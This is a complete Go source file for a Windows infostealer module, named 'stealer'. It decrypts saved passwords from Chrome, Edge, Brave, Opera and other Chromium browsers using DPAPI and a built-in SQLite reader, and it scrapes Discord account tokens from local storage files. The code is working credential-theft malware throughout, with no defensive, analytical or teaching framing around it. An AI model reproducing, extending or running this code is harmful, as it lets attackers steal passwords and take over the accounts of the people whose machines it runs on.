//go:build windows

package stealer

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ── Exported types ────────────────────────────────────────────────

type Credential struct {
	Browser  string `json:"browser"`
	Profile  string `json:"profile"`
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type Result struct {
	Credentials []Credential `json:"credentials"`
	Tokens      []string     `json:"tokens"`
	Errors      []string     `json:"errors"`
}

// ── Windows DPAPI ─────────────────────────────────────────────────

var (
	modCrypt32         = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotect = modCrypt32.NewProc("CryptUnprotectData")
	modKernel32Steal   = syscall.NewLazyDLL("kernel32.dll")
	procLocalFreeSteal = modKernel32Steal.NewProc("LocalFree")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapi(ct []byte) ([]byte, error) {
	if len(ct) == 0 {
		return nil, fmt.Errorf("empty input")
	}
	in := dataBlob{cbData: uint32(len(ct)), pbData: &ct[0]}
	var out dataBlob
	r, _, err := procCryptUnprotect.Call(
		uintptr(unsafe.Pointer(&in)), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if r == 0 {
		return nil, err
	}
	n := int(out.cbData)
	res := make([]byte, n)
	copy(res, unsafe.Slice(out.pbData, n))
	procLocalFreeSteal.Call(uintptr(unsafe.Pointer(out.pbData)))
	return res, nil
}

// ── Minimal SQLite3 reader (no external dependencies) ────────────
// Handles table B-trees without overflow pages — sufficient for
// Chrome Login Data which is typically a few hundred KB.

func sqReadVarint(b []byte) (int64, int) {
	var v int64
	for i := 0; i < 9 && i < len(b); i++ {
		if i == 8 {
			return (v << 8) | int64(b[8]), 9
		}
		v = (v << 7) | int64(b[i]&0x7F)
		if b[i]&0x80 == 0 {
			return v, i + 1
		}
	}
	return v, 1
}

// sqParseRecord parses a SQLite record payload.
// Returns: nil | int64 | string | []byte per column.
func sqParseRecord(b []byte) []interface{} {
	if len(b) == 0 {
		return nil
	}
	hs, n := sqReadVarint(b)
	if int(hs) > len(b) || n == 0 {
		return nil
	}
	pos := n
	var types []int64
	for int64(pos) < hs {
		t, m := sqReadVarint(b[pos:])
		if m == 0 {
			break
		}
		types = append(types, t)
		pos += m
	}
	dp := int(hs)
	rec := make([]interface{}, len(types))
	for i, t := range types {
		var sz int
		switch {
		case t == 0, t == 8, t == 9, t == 10, t == 11:
			sz = 0
		case t >= 1 && t <= 4:
			sz = int(t)
		case t == 5:
			sz = 6
		case t == 6, t == 7:
			sz = 8
		case t >= 12 && t%2 == 0:
			sz = int((t - 12) / 2)
		case t >= 13 && t%2 == 1:
			sz = int((t - 13) / 2)
		}
		if dp+sz > len(b) {
			break
		}
		chunk := b[dp : dp+sz]
		switch {
		case t == 8:
			rec[i] = int64(0)
		case t == 9:
			rec[i] = int64(1)
		case t >= 1 && t <= 6:
			var v int64
			for _, c := range chunk {
				v = (v << 8) | int64(c)
			}
			// sign-extend
			if sz > 0 && sz < 8 && chunk[0]&0x80 != 0 {
				v |= -(int64(1) << (uint(sz) * 8))
			}
			rec[i] = v
		case t == 7:
			// float — not needed, leave nil
		case t >= 12 && t%2 == 0:
			cp := make([]byte, sz)
			copy(cp, chunk)
			rec[i] = cp
		case t >= 13 && t%2 == 1:
			rec[i] = string(chunk)
		}
		dp += sz
	}
	return rec
}

// sqWalk walks a table B-tree rooted at pageNum and returns all leaf cell payloads.
func sqWalk(data []byte, pageSize, pageNum int) [][]byte {
	off := (pageNum - 1) * pageSize
	if off+pageSize > len(data) {
		return nil
	}
	page := data[off : off+pageSize]
	// Page 1 has a 100-byte SQLite file header before the B-tree header.
	ho := 0
	if pageNum == 1 {
		ho = 100
	}
	if len(page) < ho+8 {
		return nil
	}
	ptype := page[ho]
	ncells := int(binary.BigEndian.Uint16(page[ho+3 : ho+5]))

	switch ptype {
	case 0x0D: // leaf table page
		var out [][]byte
		for i := 0; i < ncells; i++ {
			cpoff := ho + 8 + i*2
			if cpoff+2 > len(page) {
				break
			}
			coff := int(binary.BigEndian.Uint16(page[cpoff : cpoff+2]))
			if coff >= len(page) {
				continue
			}
			psz, n1 := sqReadVarint(page[coff:])
			_, n2 := sqReadVarint(page[coff+n1:])
			s := coff + n1 + n2
			e := s + int(psz)
			if e > len(page) {
				e = len(page)
			}
			if s < e {
				pl := make([]byte, e-s)
				copy(pl, page[s:e])
				out = append(out, pl)
			}
		}
		return out

	case 0x05: // interior table page
		if len(page) < ho+12 {
			return nil
		}
		rightmost := int(binary.BigEndian.Uint32(page[ho+8 : ho+12]))
		var out [][]byte
		for i := 0; i < ncells; i++ {
			cpoff := ho + 12 + i*2
			if cpoff+2 > len(page) {
				break
			}
			coff := int(binary.BigEndian.Uint16(page[cpoff : cpoff+2]))
			if coff+4 > len(page) {
				continue
			}
			left := int(binary.BigEndian.Uint32(page[coff : coff+4]))
			out = append(out, sqWalk(data, pageSize, left)...)
		}
		return append(out, sqWalk(data, pageSize, rightmost)...)
	}
	return nil
}

// sqColIndices parses a CREATE TABLE statement to find column indices.
// Falls back to Chrome defaults (0, 3, 5) if parsing fails.
func sqColIndices(sql string) (urlIdx, userIdx, passIdx int) {
	urlIdx, userIdx, passIdx = 0, 3, 5
	i := strings.Index(sql, "(")
	if i < 0 {
		return
	}
	body := sql[i+1:]
	if j := strings.LastIndex(body, ")"); j > 0 {
		body = body[:j]
	}
	idx := 0
	for _, part := range strings.Split(body, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		up := strings.ToUpper(part)
		if strings.HasPrefix(up, "UNIQUE") || strings.HasPrefix(up, "PRIMARY") || strings.HasPrefix(up, "CONSTRAINT") {
			continue
		}
		f := strings.Fields(part)
		if len(f) == 0 {
			continue
		}
		col := strings.ToLower(strings.Trim(f[0], "\"'`"))
		switch col {
		case "origin_url":
			urlIdx = idx
		case "username_value":
			userIdx = idx
		case "password_value":
			passIdx = idx
		}
		idx++
	}
	return
}

type loginRow struct {
	url      string
	username string
	encPass  []byte
}

func sqReadLogins(path string) ([]loginRow, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	if len(data) < 100 || string(data[:16]) != "SQLite format 3\x00" {
		return nil, fmt.Errorf("not a valid SQLite3 file")
	}
	ps := int(binary.BigEndian.Uint16(data[16:18]))
	if ps == 1 {
		ps = 65536
	}

	// Find logins table root page from sqlite_master (page 1).
	loginsRoot := 0
	var loginsSQL string
	for _, pl := range sqWalk(data, ps, 1) {
		rec := sqParseRecord(pl)
		if len(rec) < 5 {
			continue
		}
		t, _ := rec[0].(string)
		name, _ := rec[1].(string)
		if t != "table" || name != "logins" {
			continue
		}
		rp, _ := rec[3].(int64)
		loginsRoot = int(rp)
		loginsSQL, _ = rec[4].(string)
		break
	}
	if loginsRoot == 0 {
		return nil, fmt.Errorf("logins table not found")
	}

	urlIdx, userIdx, passIdx := sqColIndices(loginsSQL)
	maxIdx := passIdx
	if urlIdx > maxIdx {
		maxIdx = urlIdx
	}
	if userIdx > maxIdx {
		maxIdx = userIdx
	}

	var rows []loginRow
	for _, pl := range sqWalk(data, ps, loginsRoot) {
		rec := sqParseRecord(pl)
		if len(rec) <= maxIdx {
			continue
		}
		url, _ := rec[urlIdx].(string)
		username, _ := rec[userIdx].(string)
		var ep []byte
		switch v := rec[passIdx].(type) {
		case []byte:
			ep = v
		case string:
			ep = []byte(v)
		}
		if url == "" && username == "" {
			continue
		}
		rows = append(rows, loginRow{url: url, username: username, encPass: ep})
	}
	return rows, nil
}

// ── Chrome password decryption ────────────────────────────────────

func getMasterKey(userDataPath string) ([]byte, error) {
	raw, err := os.ReadFile(filepath.Join(userDataPath, "Local State"))
	if err != nil {
		return nil, err
	}
	var ls struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &ls); err != nil {
		return nil, err
	}
	b64, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if len(b64) <= 5 {
		return nil, fmt.Errorf("key too short")
	}
	return dpapi(b64[5:]) // strip "DPAPI" prefix (5 bytes)
}

func decryptPass(masterKey, enc []byte) string {
	if len(enc) < 3 {
		return ""
	}
	if string(enc[:3]) == "v10" || string(enc[:3]) == "v20" {
		// AES-256-GCM: 3-byte version tag + 12-byte nonce + ciphertext+tag
		if len(enc) < 3+12+16 {
			return ""
		}
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return ""
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return ""
		}
		plain, err := gcm.Open(nil, enc[3:15], enc[15:], nil)
		if err != nil {
			return ""
		}
		return string(plain)
	}
	// Legacy format: raw DPAPI blob
	plain, err := dpapi(enc)
	if err != nil {
		return ""
	}
	return string(plain)
}

// ── Browser collection ────────────────────────────────────────────

type browserDef struct{ name, path string }

func browserDefs() []browserDef {
	local := os.Getenv("LOCALAPPDATA")
	roam := os.Getenv("APPDATA")
	return []browserDef{
		{"Chrome", filepath.Join(local, `Google\Chrome\User Data`)},
		{"Edge", filepath.Join(local, `Microsoft\Edge\User Data`)},
		{"Brave", filepath.Join(local, `BraveSoftware\Brave-Browser\User Data`)},
		{"Chromium", filepath.Join(local, `Chromium\User Data`)},
		{"Opera GX", filepath.Join(roam, `Opera Software\Opera GX Stable`)},
		{"Opera", filepath.Join(roam, `Opera Software\Opera Stable`)},
		{"Vivaldi", filepath.Join(local, `Vivaldi\User Data`)},
		{"Yandex", filepath.Join(local, `Yandex\YandexBrowser\User Data`)},
	}
}

var browserProfiles = []string{
	"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5",
}

func cpFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

func stealBrowser(b browserDef, key []byte) []Credential {
	var creds []Credential
	for _, profile := range browserProfiles {
		src := filepath.Join(b.path, profile, "Login Data")
		if _, err := os.Stat(src); err != nil {
			continue
		}
		// Chrome locks the live file; copy to temp first.
		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("ol_%x.tmp", time.Now().UnixNano()))
		if err := cpFile(src, tmp); err != nil {
			continue
		}
		rows, err := sqReadLogins(tmp)
		os.Remove(tmp)
		if err != nil {
			continue
		}
		for _, r := range rows {
			pass := decryptPass(key, r.encPass)
			if pass == "" {
				continue
			}
			creds = append(creds, Credential{
				Browser:  b.name,
				Profile:  profile,
				URL:      r.url,
				Username: r.username,
				Password: pass,
			})
		}
	}
	return creds
}

// ── Discord token extraction ──────────────────────────────────────

var tokenRe = regexp.MustCompile(`[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}`)

func stealDiscord() []string {
	roam := os.Getenv("APPDATA")
	dirs := []string{
		filepath.Join(roam, `discord\Local Storage\leveldb`),
		filepath.Join(roam, `discordcanary\Local Storage\leveldb`),
		filepath.Join(roam, `discordptb\Local Storage\leveldb`),
	}
	seen := make(map[string]struct{})
	var tokens []string
	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			n := e.Name()
			if !strings.HasSuffix(n, ".ldb") && !strings.HasSuffix(n, ".log") {
				continue
			}
			data, err := os.ReadFile(filepath.Join(dir, n))
			if err != nil {
				continue
			}
			for _, m := range tokenRe.FindAll(data, -1) {
				t := string(m)
				if _, dup := seen[t]; !dup {
					seen[t] = struct{}{}
					tokens = append(tokens, t)
				}
			}
		}
	}
	return tokens
}

// ── Entry point ───────────────────────────────────────────────────

func Run() Result {
	r := Result{}
	for _, b := range browserDefs() {
		if _, err := os.Stat(b.path); err != nil {
			continue
		}
		key, err := getMasterKey(b.path)
		if err != nil {
			r.Errors = append(r.Errors, b.name+": "+err.Error())
			continue
		}
		r.Credentials = append(r.Credentials, stealBrowser(b, key)...)
	}
	r.Tokens = stealDiscord()
	return r
}
